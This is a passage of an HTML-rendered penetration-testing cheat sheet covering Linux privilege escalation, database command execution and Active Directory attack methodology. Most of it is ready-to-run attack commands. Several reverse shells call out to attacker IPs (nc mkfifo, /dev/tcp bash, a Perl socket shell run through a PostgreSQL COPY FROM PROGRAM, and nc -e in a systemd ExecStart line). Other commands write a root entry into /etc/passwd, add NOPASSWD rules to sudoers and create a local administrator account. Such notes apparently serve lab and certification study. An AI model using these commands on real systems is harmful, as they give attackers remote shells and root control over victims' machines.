<span class="o">*</span><span class="nx">Evil</span><span class="o">-</span><span class="nx">WinRM</span><span class="o">*</span> <span class="nx">PS</span> <span class="nx">C</span><span class="p">:</span><span class="err">\</span><span class="nx">windows</span><span class="p">.</span><span class="nx">old</span><span class="err">\</span><span class="nx">Windows</span><span class="err">\</span><span class="nx">system32</span><span class="o">&gt;</span> <span class="nx">download</span> <span class="nx">SYSTEM</span> <span class="p">.</span>

<span class="nx">Try</span> <span class="nx">ssh</span><span class="o">/</span><span class="nx">psexec</span><span class="o">/</span><span class="nx">wmiexec</span><span class="o">/</span><span class="nx">rdp</span>

</code></pre></div></div>

<h3 id="local-web-runas-adminsystem">Local web runas Admin/System</h3>

<p>GET reuqest</p>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">curl</span> <span class="nx">http</span><span class="p">:</span><span class="c1">//nickel #cmd</span>
<span class="nx">Invoke</span><span class="o">-</span><span class="nx">WebRequest</span> <span class="o">-</span><span class="nx">UseBasicParsing</span> <span class="o">-</span><span class="nx">Uri</span> <span class="nx">http</span><span class="p">:</span><span class="c1">//example.com/ #powershell</span>
</code></pre></div></div>

<h2 id="linux"><strong>Linux</strong></h2>

<h3 id="autoscan-1">AutoScan</h3>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">bash</span> <span class="nx">linpeas</span><span class="p">.</span><span class="nx">sh</span> <span class="o">&gt;</span> <span class="nx">out</span><span class="p">.</span><span class="nx">txt</span>
<span class="p">.</span><span class="o">/</span><span class="nx">LinEnum</span><span class="p">.</span><span class="nx">sh</span> <span class="o">-</span><span class="nx">s</span> <span class="o">-</span><span class="nx">k</span> <span class="nx">keyword</span> <span class="o">-</span><span class="nx">r</span> <span class="nx">report</span> <span class="o">-</span><span class="nx">e</span> <span class="o">/</span><span class="nx">tmp</span><span class="o">/</span> <span class="o">-</span><span class="nx">t</span>
<span class="nx">cat</span> <span class="nx">out</span><span class="p">.</span><span class="nx">txt</span> <span class="o">|</span> <span class="nx">less</span> <span class="o">-</span><span class="nx">r</span>
</code></pre></div></div>

<h3 id="switch-user-1">Switch User</h3>

<p>password reuse</p>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">su</span> <span class="nx">root</span>
<span class="nx">any</span> <span class="nx">password</span> <span class="nx">you</span> <span class="nx">can</span> <span class="nx">find</span>
</code></pre></div></div>

<p>username reuse</p>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">su</span> <span class="nx">patricks</span>
<span class="nx">patricks</span>
</code></pre></div></div>

<h3 id="kernel-version">Kernel Version</h3>

<p>Linux Kernel 5.8 &lt; 5.16.11 - Local Privilege Escalation (DirtyPipe)</p>

<p>Fixed:<code class="language-plaintext highlighter-rouge">5.16.11, 5.15.25, 5.10.102</code></p>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">https</span><span class="p">:</span><span class="c1">//github.com/Al1ex/CVE-2022-0847</span>
</code></pre></div></div>

<h3 id="scheduled-tasks--cron">Scheduled Tasks / Cron</h3>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">cat</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">crontab</span>
<span class="n">ls</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">cron</span><span class="mf">.</span><span class="o">*</span>
<span class="n">grep</span> <span class="s2">"CRON"</span> <span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">log</span><span class="o">/</span><span class="n">syslog</span>

<span class="k">echo</span> <span class="s2">"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.118.1 1234 &gt;/tmp/f"</span> <span class="o">&gt;&gt;</span> <span class="n">user_backups</span><span class="mf">.</span><span class="n">sh</span>
</code></pre></div></div>

<h3 id="hidden-cron">Hidden Cron</h3>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">.</span><span class="o">/</span><span class="nx">pspy6</span> 
<span class="nx">timeout</span> <span class="mi">60</span><span class="nx">s</span> <span class="nx">pspy32s</span>


<span class="nx">verify</span> <span class="nx">directory</span> <span class="nx">permission</span> <span class="p">(</span><span class="nx">r</span><span class="o">/</span><span class="nx">w</span><span class="p">)</span>
<span class="nx">re</span><span class="o">-</span><span class="nx">run</span> <span class="nx">commands</span> <span class="nx">to</span> <span class="nx">test</span> <span class="nx">root</span> <span class="nx">permission</span>
</code></pre></div></div>

<p><strong>Tar</strong> <code class="language-plaintext highlighter-rouge">—checkpoint-action</code> arbitrary command execution.</p>

<blockquote>
  <p>https://www.exploit-db.com/papers/33930</p>

</blockquote>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">//CMD: UID=0     PID=32358  | /bin/bash -c cd /opt/admin &amp;&amp; tar -zxf /tmp/backup.tar.gz * </span>
<span class="nx">dave</span><span class="p">@</span><span class="nd">fake</span><span class="p">:</span><span class="o">/</span><span class="nx">opt</span><span class="o">/</span><span class="nx">admin$</span> <span class="nx">echo</span> <span class="dl">"</span><span class="s2">/bin/bash -i &gt;&amp; /dev/tcp/192.168.1.1/8080 0&gt;&amp;1</span><span class="dl">"</span> <span class="o">&gt;</span> <span class="nx">shell</span><span class="p">.</span><span class="nx">sh</span>
<span class="nx">dave</span><span class="p">@</span><span class="nd">fake</span><span class="p">:</span><span class="o">/</span><span class="nx">opt</span><span class="o">/</span><span class="nx">admin$</span> <span class="nx">echo</span> <span class="o">&gt;</span> <span class="dl">"</span><span class="s2">--checkpoint-action=exec=bash shell.sh</span><span class="dl">"</span>
<span class="nx">dave</span><span class="p">@</span><span class="nd">fake</span><span class="p">:</span><span class="o">/</span><span class="nx">opt</span><span class="o">/</span><span class="nx">admin$</span> <span class="nx">echo</span> <span class="o">&gt;</span> <span class="dl">"</span><span class="s2">--checkpoint=1</span><span class="dl">"</span>
</code></pre></div></div>

<p>Directly Executing bash file (writable)</p>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">//CMD: UID=0     PID=2309   | /bin/bash /opt/log-backup.sh </span>
<span class="c1">//CMD: UID=0     PID=2311   | tar -czf /root/backup/log_backup_20240624204301.tar.gz /root/backup/log_backup_20240624204301  </span>
<span class="nx">echo</span> <span class="dl">"</span><span class="s2">/bin/bash -i &gt;&amp; /dev/tcp/192.168.1.1/8080 0&gt;&amp;1</span><span class="dl">"</span> <span class="o">&gt;&gt;</span> <span class="sr">/opt/</span><span class="nx">log</span><span class="o">-</span><span class="nx">backup</span><span class="p">.</span><span class="nx">sh</span> 

<span class="err">#</span><span class="p">.</span><span class="nx">sh</span> <span class="nx">need</span> <span class="nx">to</span> <span class="nx">start</span> <span class="kd">with</span> <span class="cp">#!/bin/bash
</span></code></pre></div></div>

<h3 id="sudo">Sudo</h3>

<p>Sudo List</p>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">sudo</span> <span class="o">-</span><span class="nx">l</span>
<span class="nx">https</span><span class="p">:</span><span class="c1">//gtfobins.github.io/</span>

<span class="c1">//check user group</span>
<span class="nx">cat</span> <span class="o">/</span><span class="nx">etc</span><span class="o">/</span><span class="nx">groups</span>
<span class="c1">//ALL:ALL NOPASS</span>
<span class="nx">sudo</span> <span class="nx">su</span>
<span class="nx">sudo</span> <span class="o">-</span><span class="nx">i</span>

<span class="c1">//(ALL) NOPASSWD: /usr/bin/psql</span>
<span class="nx">https</span><span class="p">:</span><span class="c1">//gtfobins.github.io/gtfobins/psql/#sudo</span>

<span class="c1">//(ALL) NOPASSWD: /usr/bin/ruby /home/andrew/app/app.rb</span>
<span class="nx">echo</span> <span class="dl">'</span><span class="s1">exec "/bin/bash"</span><span class="dl">'</span> <span class="o">&gt;</span> <span class="nx">app</span><span class="p">.</span><span class="nx">rb</span>
<span class="nx">sudo</span> <span class="o">/</span><span class="nx">usr</span><span class="o">/</span><span class="nx">bin</span><span class="o">/</span><span class="nx">ruby</span> <span class="o">/</span><span class="nx">home</span><span class="o">/</span><span class="nx">andrew</span><span class="o">/</span><span class="nx">app</span><span class="o">/</span><span class="nx">app</span><span class="p">.</span><span class="nx">rb</span>

<span class="nx">ls</span> <span class="o">-</span><span class="nx">l</span> <span class="o">/</span><span class="nx">etc</span><span class="o">/</span><span class="nx">sudoers</span>

<span class="c1">//(ALL : ALL) ALL</span>
<span class="c1">//(root) NOPASSWD: /usr/bin/composer --working-dir\=/var/www/html/lavita * =&gt; * means any behavior</span>
<span class="nx">sudo</span> <span class="nx">composer</span> <span class="o">--</span><span class="nx">working</span><span class="o">-</span><span class="nx">dir</span><span class="o">=</span><span class="nx">$TF</span> <span class="nx">run</span><span class="o">-</span><span class="nx">script</span> <span class="nx">x</span>
</code></pre></div></div>

<p>Sudo Version</p>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">sudo</span> <span class="o">-</span><span class="nx">V</span>
<span class="nx">https</span><span class="p">:</span><span class="c1">//github.com/mohinparamasivam/Sudo-1.8.31-Root-Exploit</span>
</code></pre></div></div>

<p>Sudo Group Privilege</p>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">//switch to skunk</span>
<span class="nx">uid</span><span class="o">=</span><span class="mi">0</span><span class="p">(</span><span class="nx">root</span><span class="p">)</span> <span class="nx">gid</span><span class="o">=</span><span class="mi">0</span><span class="p">(</span><span class="nx">root</span><span class="p">)</span> <span class="nx">groups</span><span class="o">=</span><span class="mi">0</span><span class="p">(</span><span class="nx">root</span><span class="p">)</span>                                                                                                                                            
<span class="nx">uid</span><span class="o">=</span><span class="mi">1001</span><span class="p">(</span><span class="nx">skunk</span><span class="p">)</span> <span class="nx">gid</span><span class="o">=</span><span class="mi">1001</span><span class="p">(</span><span class="nx">skunk</span><span class="p">)</span> <span class="nx">groups</span><span class="o">=</span><span class="mi">1001</span><span class="p">(</span><span class="nx">skunk</span><span class="p">),</span><span class="mi">27</span><span class="p">(</span><span class="nx">sudo</span><span class="p">),</span><span class="mi">33</span><span class="p">(</span><span class="nx">www</span><span class="o">-</span><span class="nx">data</span><span class="p">)</span>
</code></pre></div></div>

<h3 id="suid">SUID</h3>

<blockquote>
  <p>https://gtfobins.github.io/</p>

</blockquote>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">find</span> <span class="o">/</span> <span class="o">-</span><span class="nx">perm</span> <span class="o">-</span><span class="nx">u</span><span class="o">=</span><span class="nx">s</span> <span class="o">-</span><span class="nx">type</span> <span class="nx">f</span> <span class="mi">2</span><span class="o">&gt;</span><span class="sr">/dev/</span><span class="kc">null</span>
<span class="nx">find</span> <span class="o">/</span> <span class="o">-</span><span class="nx">perm</span> <span class="o">/</span><span class="mi">4000</span> <span class="mi">2</span><span class="o">&gt;</span><span class="sr">/dev/</span><span class="kc">null</span>
<span class="nx">find</span> <span class="o">/</span> <span class="o">-</span><span class="nx">perm</span> <span class="o">-</span><span class="mi">4000</span> <span class="o">-</span><span class="nx">user</span> <span class="nx">root</span> <span class="o">-</span><span class="nx">exec</span> <span class="nx">ls</span> <span class="o">-</span><span class="nx">ld</span> <span class="p">{}</span> <span class="err">\</span><span class="p">;</span> <span class="mi">2</span><span class="o">&gt;</span> <span class="sr">/dev/</span><span class="kc">null</span>
<span class="c1">//some suid binary</span>
<span class="o">-</span><span class="nx">rwsr</span><span class="o">-</span><span class="nx">xr</span><span class="o">-</span><span class="nx">x</span>  <span class="mi">1</span> <span class="nx">root</span>  <span class="nx">wheel</span>    <span class="mi">29</span><span class="nx">K</span> <span class="nx">Oct</span>  <span class="mi">6</span>  <span class="mi">2022</span> <span class="o">/</span><span class="nx">usr</span><span class="o">/</span><span class="nx">local</span><span class="o">/</span><span class="nx">bin</span><span class="o">/</span><span class="nx">doas</span>
</code></pre></div></div>

<p>check process permission</p>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">ps</span> <span class="nx">u</span> <span class="o">-</span><span class="nx">C</span> <span class="nx">passwd</span>
<span class="nx">grep</span> <span class="nx">Uid</span> <span class="o">/</span><span class="nx">proc</span><span class="o">/</span><span class="mi">1932</span><span class="o">/</span><span class="nx">status</span>
</code></pre></div></div>

<p>binaries</p>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">#</span><span class="nx">dosbox</span>
<span class="nx">LFILE</span><span class="o">=</span><span class="dl">'</span><span class="s1">/etc/sudoers</span><span class="dl">'</span>
<span class="o">/</span><span class="nx">usr</span><span class="o">/</span><span class="nx">bin</span><span class="o">/</span><span class="nx">dosbox</span> <span class="o">-</span><span class="nx">c</span> <span class="dl">'</span><span class="s1">mount c /</span><span class="dl">'</span> <span class="o">-</span><span class="nx">c</span> <span class="dl">"</span><span class="s2">echo Sarge ALL=(root) NOPASSWD: ALL &gt;&gt; c:$LFILE</span><span class="dl">"</span> <span class="o">-</span><span class="nx">c</span> <span class="nx">exit</span>
</code></pre></div></div>

<h3 id="capabilities">Capabilities</h3>

<p>setuid</p>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="sr">/usr/</span><span class="nx">sbin</span><span class="o">/</span><span class="nx">getcap</span> <span class="o">-</span><span class="nx">r</span> <span class="o">/</span> <span class="mi">2</span><span class="o">&gt;</span><span class="sr">/dev/</span><span class="kc">null</span>

<span class="o">/</span><span class="nx">usr</span><span class="o">/</span><span class="nx">bin</span><span class="o">/</span><span class="nx">perl</span> <span class="o">=</span> <span class="nx">cap_setuid</span><span class="o">+</span><span class="nx">ep</span>
<span class="o">/</span><span class="nx">usr</span><span class="o">/</span><span class="nx">bin</span><span class="o">/</span><span class="nx">perl5</span><span class="p">.</span><span class="mf">28.1</span> <span class="o">=</span> <span class="nx">cap_setuid</span><span class="o">+</span><span class="nx">ep</span>
<span class="o">/</span><span class="nx">usr</span><span class="o">/</span><span class="nx">bin</span><span class="o">/</span><span class="nx">python3</span><span class="p">.</span><span class="mi">10</span> <span class="nx">cap_setuid</span><span class="o">=</span><span class="nx">ep</span>
</code></pre></div></div>

<h3 id="misconfigured-access">Misconfigured access</h3>

<p>Restart service</p>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="sr">/usr/</span><span class="nx">local</span><span class="o">/</span><span class="nx">www</span><span class="o">/</span><span class="nx">apache24</span><span class="o">/</span><span class="nx">data</span><span class="o">/</span><span class="nx">phpMyAdmin</span><span class="o">/</span><span class="nx">tmp</span>
<span class="o">/</span><span class="nx">usr</span><span class="o">/</span><span class="nx">local</span><span class="o">/</span><span class="nx">bin</span><span class="o">/</span><span class="nx">doas</span> <span class="nx">service</span> <span class="nx">apache24</span> <span class="nx">onestart</span> <span class="err">#</span><span class="k">if</span> <span class="nx">doas</span> <span class="nx">is</span> <span class="nx">suid</span> <span class="nx">binary</span>
</code></pre></div></div>

<p>Write to /etc/passwd</p>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">openssl</span> <span class="nx">passwd</span> <span class="nx">w00t</span>
<span class="nx">echo</span> <span class="dl">"</span><span class="s2">root2:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash</span><span class="dl">"</span> <span class="o">&gt;&gt;</span> <span class="sr">/etc/</span><span class="nx">passwd</span>
<span class="nx">su</span> <span class="nx">root2</span>

<span class="c1">//pass root2</span>
 <span class="o">-</span><span class="nx">c</span> <span class="dl">"</span><span class="s2">echo root2:</span><span class="se">\</span><span class="s2">$1</span><span class="se">\</span><span class="s2">$IdiABLmH</span><span class="se">\</span><span class="s2">$mD1mSZbPztSmvht.AbtkN.:0:0:root:/root:/bin/bash</span><span class="dl">"</span> <span class="o">&gt;&gt;</span> <span class="sr">/etc/</span><span class="nx">passwd</span>
</code></pre></div></div>

<p>Write to suders</p>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">echo</span> <span class="dl">"</span><span class="s2">&lt;username&gt; ALL=(root) NOPASSWD: ALL</span><span class="dl">"</span> <span class="o">&gt;&gt;</span> <span class="sr">/etc/</span><span class="nx">sudoers</span> <span class="err">#</span><span class="nx">fill</span> <span class="nx">out</span> <span class="nx">username</span>
</code></pre></div></div>

<h3 id="writable-path">Writable Path</h3>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="sr">/tmp/</span>
<span class="o">/</span><span class="nx">dev</span><span class="o">/</span><span class="nx">shm</span><span class="o">/</span>
<span class="sr">/var/</span><span class="nx">tmp</span><span class="o">/</span>
</code></pre></div></div>

<h3 id="environment-variables">Environment variables</h3>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">AppKey</span><span class="p">:</span><span class="nx">passw0rd</span><span class="o">!</span>
</code></pre></div></div>

<p>add path to PATH</p>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">export</span> <span class="nx">PATH</span><span class="o">=</span><span class="nx">$PATH</span><span class="p">:</span><span class="o">/</span><span class="nx">opt</span><span class="o">/</span><span class="nx">aerospike</span><span class="o">/</span><span class="nx">bin</span><span class="o">/</span><span class="nx">asadm</span>
</code></pre></div></div>

<h3 id="interesting-file-1">Interesting file</h3>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">history</span>
<span class="p">.</span><span class="nx">bash_history</span>
<span class="p">.</span><span class="nx">bash_aliases</span>
<span class="o">/</span><span class="kd">var</span><span class="sr">/www/</span><span class="nx">html</span><span class="o">/</span>
<span class="sr">/hom</span><span class="err">e
</span><span class="o">/</span><span class="kd">var</span><span class="sr">/li</span><span class="err">b
</span><span class="o">/</span><span class="kd">var</span><span class="sr">/d</span><span class="err">b
</span><span class="o">/</span><span class="nx">opt</span>
<span class="o">/</span><span class="nx">tmp</span>
<span class="o">/</span><span class="nx">etc</span><span class="o">/</span><span class="nx">exports</span>
</code></pre></div></div>

<h3 id="postgresql">PostgreSQL</h3>

<p>Basic commands</p>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
<span class="nx">psql</span> <span class="o">--</span><span class="nx">host</span><span class="o">=</span><span class="mf">127.0</span><span class="p">.</span><span class="mf">0.1</span> <span class="o">-</span><span class="nx">U</span> <span class="nx">postgres</span>
<span class="err">\</span><span class="nx">list</span> <span class="err">#</span> <span class="nx">List</span> <span class="nx">databases</span>
<span class="err">\</span><span class="nx">c</span> <span class="o">&lt;</span><span class="nx">database</span><span class="o">&gt;</span> <span class="err">#</span> <span class="nx">use</span> <span class="nx">the</span> <span class="nx">database</span>
<span class="err">\</span><span class="nx">d</span> <span class="err">#</span> <span class="nx">List</span> <span class="nx">tables</span>
<span class="err">\</span><span class="nx">du</span><span class="o">+</span> <span class="err">#</span> <span class="nx">Get</span> <span class="nx">users</span> <span class="nx">roles</span>
<span class="err">#</span> <span class="nx">SELECT</span> <span class="nx">current_setting</span><span class="p">(</span><span class="dl">'</span><span class="s1">is_superuser</span><span class="dl">'</span><span class="p">);</span>
</code></pre></div></div>

<p>RCE</p>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">//Postgres version 9.3+,super user RCE</span>
<span class="nx">DROP</span> <span class="nx">TABLE</span> <span class="nx">IF</span> <span class="nx">EXISTS</span> <span class="nx">cmd_exec</span><span class="p">;</span>
<span class="nx">CREATE</span> <span class="nx">TABLE</span> <span class="nx">cmd_exec</span><span class="p">(</span><span class="nx">cmd_output</span> <span class="nx">text</span><span class="p">);</span>
<span class="c1">//COPY cmd_exec FROM PROGRAM '/bin/sh -i &gt;&amp; /dev/tcp/192.168.45.201/80 0&gt;&amp;1';</span>
<span class="c1">//COPY cmd_exec FROM PROGRAM 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.1.1 80 &gt;/tmp/f';</span>
<span class="nx">COPY</span> <span class="nx">cmd_exec</span> <span class="nx">FROM</span> <span class="nx">PROGRAM</span> <span class="dl">'</span><span class="s1">perl -MIO -e </span><span class="dl">''</span><span class="s1">$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"192.168.1.1:80");STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;</span><span class="dl">'''</span><span class="p">;</span>
<span class="nx">SELECT</span> <span class="o">*</span> <span class="nx">FROM</span> <span class="nx">cmd_exec</span><span class="p">;</span>
<span class="nx">DROP</span> <span class="nx">TABLE</span> <span class="nx">IF</span> <span class="nx">EXISTS</span> <span class="nx">cmd_exec</span><span class="p">;</span>
</code></pre></div></div>

<h3 id="mysql">MySQL</h3>

<p>RCE via malicious plugin</p>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">//locate mysql privilege escalation library in kali</span>
<span class="nx">locate</span> <span class="dl">"</span><span class="s2">*lib_mysqludf_sys*</span><span class="dl">"</span>

<span class="c1">//upload to plugin folder and load</span>
<span class="nx">show</span> <span class="nx">variables</span> <span class="nx">like</span> <span class="dl">'</span><span class="s1">%plugin%</span><span class="dl">'</span><span class="p">;</span>
<span class="nx">create</span> <span class="kd">function</span> <span class="nx">sys_exec</span> <span class="nx">returns</span> <span class="nx">string</span> <span class="nx">soname</span> <span class="dl">'</span><span class="s1">lib_mysqludf_sys.so</span><span class="dl">'</span><span class="p">;</span>
<span class="nx">SELECT</span> <span class="nx">sys_exec</span><span class="p">(</span><span class="dl">"</span><span class="s2">net user dave Dave123 /add</span><span class="dl">"</span><span class="p">);</span>
<span class="nx">SELECT</span> <span class="nx">sys_exec</span><span class="p">(</span><span class="dl">"</span><span class="s2">net localgroup Administrators dave /add</span><span class="dl">"</span><span class="p">);</span>
</code></pre></div></div>

<p>RCE via administrator privilege (read&amp;write)</p>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">//check read permission</span>
<span class="nx">select</span> <span class="nx">load_file</span><span class="p">(</span><span class="dl">'</span><span class="s1">C:</span><span class="se">\\\\</span><span class="s1">Users</span><span class="se">\\</span><span class="s1">Administrator</span><span class="se">\\</span><span class="s1">Desktop</span><span class="se">\\</span><span class="s1">proof.txt</span><span class="dl">'</span><span class="p">);</span>

</code></pre></div></div>

<p>Password Reuse</p>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">mysql</span> <span class="o">-</span><span class="nx">u</span> <span class="nx">dave2</span> <span class="o">-</span><span class="nx">pPassw0rd</span><span class="o">!</span>
<span class="nx">mysql</span> <span class="o">-</span><span class="nx">u</span> <span class="nx">root</span> <span class="o">-</span><span class="nx">pPassw0rd</span><span class="o">!</span>
</code></pre></div></div>

<p>Credentials</p>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">table_name</span> <span class="nx">like</span> <span class="nx">customers</span>
</code></pre></div></div>

<h3 id="service-1">.Service</h3>

<p>escalate privilege after reboot</p>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">//modify file via vi</span>
<span class="nx">vi</span> <span class="o">/</span><span class="nx">etc</span><span class="o">/</span><span class="nx">systemd</span><span class="o">/</span><span class="nx">system</span><span class="o">/</span><span class="nx">pythonapp</span><span class="p">.</span><span class="nx">service</span>

<span class="p">[</span><span class="nx">Service</span><span class="p">]</span>
<span class="nx">ExecStart</span><span class="o">=</span><span class="nx">nc</span> <span class="mf">192.168</span><span class="p">.</span><span class="mf">1.1</span> <span class="mi">80</span> <span class="o">-</span><span class="nx">e</span> <span class="o">/</span><span class="nx">bin</span><span class="o">/</span><span class="nx">bash</span>
<span class="nx">User</span><span class="o">=</span><span class="nx">root</span>
</code></pre></div></div>

<h3 id="inside-container">Inside container</h3>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">//linpeas.sh                                                                                                                        </span>
<span class="err">═╣</span> <span class="nx">Is</span> <span class="k">this</span> <span class="nx">a</span> <span class="nx">container</span><span class="p">?</span> <span class="p">...........</span> <span class="nx">docker</span>  
</code></pre></div></div>

<h1 id="ad">AD</h1>

<h3 id="methodology">Methodology</h3>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">initial</span> <span class="nx">access</span><span class="p">:</span>
<span class="mi">1</span><span class="p">.</span><span class="nx">rce</span>
<span class="mi">2</span><span class="p">.</span><span class="nx">passwd</span>
<span class="mi">3</span><span class="p">.</span><span class="nx">authenticated</span> <span class="nx">hash</span>

<span class="nx">normal</span> <span class="nx">account</span>
<span class="mi">1</span><span class="p">.</span><span class="nx">AS</span><span class="o">-</span><span class="nx">REP</span> <span class="nx">Roasting</span>
<span class="mi">2</span><span class="p">.</span><span class="nx">Kerberoasting</span>
<span class="mi">3</span><span class="p">.</span><span class="nx">history</span>

<span class="nx">admin</span> <span class="nx">account</span>
<span class="mi">1</span><span class="p">.</span><span class="nx">mimikatz</span>
<span class="mi">2</span><span class="p">.</span><span class="nx">history</span>
<span class="mi">3</span><span class="p">.</span><span class="nx">Bloodhound</span>

<span class="nx">Once</span> <span class="nx">you</span> <span class="nx">have</span> <span class="nx">a</span> <span class="nx">username</span><span class="p">:</span><span class="nx">password</span> <span class="nx">pair</span><span class="p">,</span> <span class="nx">you</span> <span class="nx">can</span> <span class="k">try</span> <span class="nx">following</span> <span class="nx">commands</span> <span class="k">from</span> <span class="nx">kali</span><span class="p">:</span>
<span class="mi">1</span><span class="p">.</span> <span class="nx">nxc</span> <span class="nx">smb</span><span class="o">/</span><span class="nx">wmi</span><span class="o">/</span><span class="nx">rdp</span><span class="o">/</span><span class="nx">winrm</span> <span class="p">(</span><span class="nx">NOTE</span><span class="p">:</span> <span class="nx">password</span> <span class="nx">reuse</span><span class="p">)</span>
<span class="mi">2</span><span class="p">.</span> <span class="nx">GetADUsers</span><span class="p">.</span><span class="nx">py</span>
<span class="mi">3</span><span class="p">.</span> <span class="nx">AS</span><span class="o">-</span><span class="nx">REP</span> <span class="nx">Roasting</span>
<span class="mi">4</span><span class="p">.</span> <span class="nx">Kerberoasting</span>
<span class="mi">5</span><span class="p">.</span> <span class="nx">bloodhound</span><span class="o">-</span><span class="nx">python</span>
</code></pre></div></div>

<h3 id="usersgroups">Users/groups</h3>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">net</span> <span class="nx">user</span> <span class="c1">//confirm local user</span>
<span class="nx">net</span> <span class="nx">user</span> <span class="o">/</span><span class="nx">domain</span> <span class="c1">//confirm domain user</span>
<span class="nx">net</span> <span class="nx">user</span> <span class="nx">name</span> <span class="o">/</span><span class="nx">domain</span>
<span class="nx">net</span> <span class="nx">group</span> <span class="o">/</span><span class="nx">domain</span>
<span class="nx">net</span> <span class="nx">group</span> <span class="nx">name</span> <span class="o">/</span><span class="nx">domain</span>
<span class="nx">whoami</span> <span class="o">/</span><span class="nx">all</span>
</code></pre></div></div>

<h3 id="bloodhound">BloodHound</h3>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">Import</span><span class="o">-</span><span class="nx">Module</span> <span class="p">.</span><span class="err">\</span><span class="nx">Sharphound</span><span class="p">.</span><span class="nx">ps1</span>
<span class="nx">Invoke</span><span class="o">-</span><span class="nx">BloodHound</span> <span class="o">-</span><span class="nx">CollectionMethod</span> <span class="nx">All</span> <span class="o">-</span><span class="nx">OutputDirectory</span> <span class="nx">C</span><span class="p">:</span><span class="err">\</span><span class="nx">Users</span><span class="err">\</span><span class="nx">Public</span><span class="err">\</span> 

<span class="nx">sudo</span> <span class="nx">apt</span> <span class="nx">install</span> <span class="nx">bloodhound</span><span class="p">.</span><span class="nx">py</span>
<span class="nx">bloodhound</span><span class="o">-</span><span class="nx">python</span> <span class="o">-</span><span class="nx">u</span> <span class="nx">dave</span> <span class="o">-</span><span class="nx">p</span> <span class="nx">passw0rd</span> <span class="o">-</span><span class="nx">d</span> <span class="nx">fake</span><span class="p">.</span><span class="nx">com</span> <span class="o">-</span><span class="nx">c</span> <span class="nx">All</span> <span class="o">-</span><span class="nx">ns</span> <span class="mf">192.168</span><span class="p">.</span><span class="mf">1.1</span>
</code></pre></div></div>

<p>customized query</p>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">#</span><span class="nx">find</span> <span class="nx">all</span> <span class="nx">computers</span> <span class="k">in</span> <span class="nx">domain</span>
<span class="nx">MATCH</span> <span class="p">(</span><span class="nx">m</span><span class="p">:</span><span class="nx">Computer</span><span class="p">)</span> <span class="nx">RETURN</span> <span class="nx">m</span>
<span class="err">#</span><span class="nx">find</span> <span class="nx">all</span> <span class="nx">users</span> <span class="k">in</span> <span class="nx">domain</span>
<span class="nx">MATCH</span> <span class="p">(</span><span class="nx">m</span><span class="p">:</span><span class="nx">User</span><span class="p">)</span> <span class="nx">RETURN</span> <span class="nx">m</span>
<span class="err">#</span><span class="nx">sessions</span>
<span class="nx">MATCH</span> <span class="nx">p</span> <span class="o">=</span> <span class="p">(</span><span class="nx">c</span><span class="p">:</span><span class="nx">Computer</span><span class="p">)</span><span class="o">-</span><span class="p">[:</span><span class="nx">HasSession</span><span class="p">]</span><span class="o">-&gt;</span><span class="p">(</span><span class="nx">m</span><span class="p">:</span><span class="nx">User</span><span class="p">)</span> <span class="nx">RETURN</span> <span class="nx">p</span>
</code></pre></div></div>

<p>check</p>

